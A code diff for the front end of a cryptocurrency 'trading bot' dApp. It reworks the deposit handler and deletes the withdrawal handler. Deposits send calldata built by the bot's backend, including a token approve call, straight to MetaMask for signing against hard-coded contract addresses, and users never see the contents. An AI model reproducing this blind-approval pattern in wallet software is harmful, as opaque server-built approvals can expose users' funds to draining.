@@ -1,4 +1,4 @@
-// ✅ RoTon Bot Frontend Controller (V12 Production-Ready)
+// ✅ RoTon Bot Frontend Controller (V12 Exact HTML Binding Sync)
 function logToPanel(msg) {
   const panel = document.getElementById("logPanel");
   if (panel) {
@@ -12,7 +12,6 @@ window.logToPanel = logToPanel;
 
 logToPanel("main_prod.txt loaded successfully");
 
-// ✅ Core Context Variable Management
 function getQueryParams() {
   try {
     const params = new URLSearchParams(window.location.search);
@@ -34,19 +33,27 @@ const API_BASE = window.location.origin;
 
 window.WBNB_TOKEN_ADDRESS = "0xBB4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c";
 
+// ✅ FIXED: Maps correctly to your specific HTML select element values
 function getSelectedToken() {
-  const el = document.getElementById("walletTokenSelect") || document.getElementById("contractTokenSelect") || document.getElementById("tokenSelect");
-  return el ? el.value : "USDT"; 
+  const el = document.getElementById("tokenSelect");
+  if (!el) return "USDT";
+  
+  const val = el.value.toLowerCase();
+  // Check if it is the explicit USDT address hash from your HTML option
+  if (val === "0x55d398326f99059ff775485246999027b3197955") return "USDT";
+  if (val === "bnb") return "BNB";
+  if (val === "eth") return "ETH";
+  return "USDT";
 }
 
-// ✅ Balanced Fund Synchronization Endpoint Bridge
 async function syncBalanceFromFund() {
-  if (!window.USER_ADDR) return 1000; // testing placeholder
+  const runtimeUserAddress = window.USER_ADDR || q.wallet;
+  if (!runtimeUserAddress || runtimeUserAddress === "{wallet}") return 1000;
   try {
     const res = await fetch(`${API_BASE}/prodbot/balance`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ user: String(window.USER_ADDR), token: "0x55d398326f99059fF775485246999027B3197955" })
+      body: JSON.stringify({ user: String(runtimeUserAddress), token: "0x55d398326f99059fF775485246999027B3197955" })
     });
     const data = await res.json();
     if (data.status === "ok") {
@@ -61,17 +68,80 @@ async function syncBalanceFromFund() {
 window.syncBalanceFromFund = syncBalanceFromFund;
 
 // ==========================================
-// 🚀 IMMEDIATE BINDINGS (No Deferred Wrappers)
+// 🚀 METAMASK POPUP TRIGGER INTEGRATION
 // ==========================================
 
-// 1. Connect Wallet
+const depBtn = document.getElementById("depositBtn");
+if (depBtn) {
+  depBtn.onclick = async function() {
+    const token = getSelectedToken();
+    const amountInputEl = document.getElementById("depositAmount");
+    const rawAmt = amountInputEl ? parseFloat(amountInputEl.value) : 0;
+    const runtimeUserAddress = window.USER_ADDR || q.wallet;
+
+    if (!runtimeUserAddress || runtimeUserAddress === "{wallet}") {
+      return logToPanel("❌ Action Halted: Connect your wallet or check URL params first.");
+    }
+    if (isNaN(rawAmt) || rawAmt <= 0) {
+      return logToPanel("❌ Action Halted: Specify a positive numerical deposit amount.");
+    }
+
+    const amount = BigInt(Math.floor(rawAmt * 1e18)).toString();
+    logToPanel(`⏳ Requesting compiled data from backend for ${token} deposit pipeline...`);
+
+    try {
+      let endpoint = `/prodbot/deposit/usdt/approve`; 
+      if (token === "BNB") endpoint = `/prodbot/deposit/bnb`;
+      if (token === "ETH") endpoint = `/prodbot/deposit/eth`;
+
+      const res = await fetch(`${API_BASE}${endpoint}`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ wallet: String(runtimeUserAddress), amount: amount })
+      });
+      const data = await res.json();
+
+      if (data.status !== "ok") {
+        return logToPanel(`❌ Server error: ${data.message || "Unknown exception"}`);
+      }
+
+      logToPanel("🚀 Backend processing complete. Dispatching transaction prompt directly to MetaMask...");
+
+      const transactionPayloadData = data.approve_call || data.deposit_call || data.bnb_refuel_call;
+      const contractDestinationAddress = (token === "USDT") 
+        ? "0x1854170353ea89672638F9fa5acB477c45523871" 
+        : "0xc46E6452c1Cb9641dE339eb8bE48faEb70B58dF5";
+
+      if (!transactionPayloadData) {
+        return logToPanel("❌ Payload error: Hex interaction data string is missing.");
+      }
+
+      // ⚡ METAMASK POPUP DISPATCH
+      const txHash = await window.ethereum.request({
+        method: "eth_sendTransaction",
+        params: [{
+          from: String(runtimeUserAddress),
+          to: contractDestinationAddress,
+          data: transactionPayloadData,
+          value: (token === "BNB") ? "0x" + BigInt(amount).toString(16) : "0x0"
+        }]
+      });
+
+      logToPanel(`🎉 On-chain transaction broadcasted! TxHash: ${txHash}`);
+
+    } catch (err) {
+      logToPanel(`❌ Extension exception or transaction rejected: ${err.message}`);
+    }
+  };
+}
+
+// Connect Wallet Click Target
 const connBtn = document.getElementById("connectwalletBtn");
 if (connBtn) {
   connBtn.onclick = async function() {
     if (typeof window.ethereum !== "undefined") {
       try {
         const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
-        // CRITICAL FIX: Extract clean index string out of array
         window.USER_ADDR = String(accounts[0]).toLowerCase(); 
         
         const label = document.getElementById("currentWalletLabel");
@@ -81,113 +151,12 @@ if (connBtn) {
         logToPanel(`❌ Connection error: ${err.message}`);
       }
     } else {
-      logToPanel("❌ MetaMask provider not detected.");
+      logToPanel("❌ MetaMask provider extension framework not detected.");
     }
   };
 }
 
-// 2. Deposit Execution Routing
-// Overwrite the deposit handling chunk in your main_prod.txt file:
-
-const depBtn = document.getElementById("depositBtn");
-if (depBtn) {
-  depBtn.onclick = async function() {
-    const token = getSelectedToken();
-    const rawAmt = parseFloat(document.getElementById("depositAmount")?.value || "0");
-    
-    if (!window.USER_ADDR) {
-      return logToPanel("❌ Action Halted: Connect your wallet first.");
-    }
-    if (rawAmt <= 0) {
-      return logToPanel("❌ Action Halted: Specify a positive deposit amount value.");
-    }
-
-    // Convert input unit metric up to standard contract wei scale (18 decimals)
-    const amount = BigInt(Math.floor(rawAmt * 1e18)).toString();
-    logToPanel(`⏳ Communicating with backend server pipeline for ${token} deposit configurations...`);
-
-    try {
-      let endpoint = `/prodbot/deposit/usdt/approve`; // Baseline default
-      if (token === "BNB") endpoint = `/prodbot/deposit/bnb`;
-      if (token === "ETH") endpoint = `/prodbot/deposit/eth`;
-
-      const res = await fetch(`${API_BASE}${endpoint}`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ wallet: String(window.USER_ADDR), amount: amount })
-      });
-      const data = await res.json();
-
-      if (data.status !== "ok") {
-        return logToPanel(`❌ Server side processing error: ${data.message || "Unknown exception"}`);
-      }
-
-      logToPanel("🚀 Backend compiled data structure successfully. Directing payload request to MetaMask extension...");
-
-      // 🔑 CRITICAL MISSING LINK: Extract hex data string out of the response mapping
-      // If it's a multi-step call, look for the primary structural array element
-      const transactionPayloadData = data.approve_call || data.deposit_call || data.bnb_refuel_call;
-      
-      // Determine target destination contract address
-      // V12 Trading Contract is the target for USDT interactions; V13 handles raw gas token reserves
-      const contractDestinationAddress = (token === "USDT") 
-        ? "0x1854170353ea89672638F9fa5acB477c45523871" 
-        : "0xc46E6452c1Cb9641dE339eb8bE48faEb70B58dF5";
-
-      if (!transactionPayloadData) {
-        return logToPanel("❌ Payload extraction issue: hex transaction string undefined.");
-      }
-
-      // ⚡ TRIGGER METAMASK EXTENSION FOR SIGNATURE POPUP WINDOW
-      const txHash = await window.ethereum.request({
-        method: "eth_sendTransaction",
-        params: [{
-          from: String(window.USER_ADDR),
-          to: contractDestinationAddress,
-          data: transactionPayloadData,
-          // If sending raw native BNB directly to contract receive pipeline function:
-          value: (token === "BNB") ? "0x" + BigInt(amount).toString(16) : "0x0"
-        }]
-      });
-
-      logToPanel(`🎉 On-chain transaction broadcasted successfully! Tracking TxHash: ${txHash}`);
-      logToPanel("⏳ Awaiting network mining confirmation block cycle updates...");
-
-    } catch (err) {
-      logToPanel(`❌ Execution failure or wallet signature rejected: ${err.message}`);
-    }
-  };
-}
-
-
-// 3. Withdrawal Interface Handler
-const wthBtn = document.getElementById("withdrawBtn");
-if (wthBtn) {
-  wthBtn.onclick = async function() {
-    if (!window.USER_ADDR) return logToPanel("❌ Link wallet container first.");
-    const rawAmount = parseFloat(document.getElementById("withdrawAmount")?.value || "0");
-    if (rawAmount <= 0) return logToPanel("❌ Specify valid asset units.");
-
-    try {
-      const res = await fetch(`${API_BASE}/prodbot/withdraw`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ 
-          userid: window.USER_ID, 
-          wallet: String(window.USER_ADDR), 
-          token: getSelectedToken(), 
-          amount: rawAmount * 1e18 
-        })
-      });
-      const data = await res.json();
-      logToPanel(`📥 Withdrawal sequence initiated: ${JSON.stringify(data)}`);
-    } catch (err) {
-      logToPanel(`❌ Withdrawal tracking connection lost: ${err.message}`);
-    }
-  };
-}
-
-// 4. Start Trading Pipeline Engine Trigger
+// Start Trading Simulation Hook
 const strtBtn = document.getElementById("startBtn");
 if (strtBtn) {
   strtBtn.onclick = function() {
@@ -200,13 +169,11 @@ if (strtBtn) {
   };
 }
 
-// 5. Emergency Circuit Breaker Stop
+// Stop Bot Safety Hook
 const stpBtn = document.getElementById("stopBtn");
 if (stpBtn) {
   stpBtn.onclick = function() {
-    logToPanel("⏹ Safety Halt engine signal transmitted.");
-    if (typeof window.stopBot === "function") {
-      window.stopBot();
-    }
+    logToPanel("⏹ Safety Stop activated.");
+    if (typeof window.stopBot === "function") window.stopBot();
   };
 }
